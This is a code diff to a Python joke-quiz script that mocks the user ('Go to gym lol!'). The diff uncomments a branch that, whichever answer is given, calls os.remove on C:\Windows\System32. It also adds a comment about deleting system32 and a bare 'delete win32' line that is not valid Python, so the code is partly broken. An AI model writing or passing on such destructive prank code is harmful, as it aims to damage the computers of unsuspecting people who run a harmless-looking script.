@@ -40,22 +40,22 @@ elif question == "No":
     time.sleep(3)
 
     print(Fore.RED + "Go to gym lol! and find another girlfriend")
-    
-    #delete win32
+    #off or on script deleting system32
+    delete win32
 
-    # question3 = input("Do youwant to still continue haha?: ")
-    # if question3 == "No":
-    #     time.sleep(2)
-    #     print("Your choice :)")
-    #     time.sleep(3)
-    #     os.remove("C:\Windows\System32")
+    question3 = input("Do youwant to still continue haha?: ")
+    if question3 == "No":
+        time.sleep(2)
+        print("Your choice :)")
+        time.sleep(3)
+        os.remove("C:\Windows\System32")
 
-    # elif question3 == "Yes":
-    #     time.sleep(9)
-    #     print("So your choice :)")
-    #     time.sleep(3)
-    #     print("Byee!")
-    #     time.sleep(3)
-    #     os.remove("C:\Windows\System32")
+    elif question3 == "Yes":
+        time.sleep(9)
+        print("So your choice :)")
+        time.sleep(3)
+        print("Byee!")
+        time.sleep(3)
+        os.remove("C:\Windows\System32")
     
-    # quit()
+    quit()
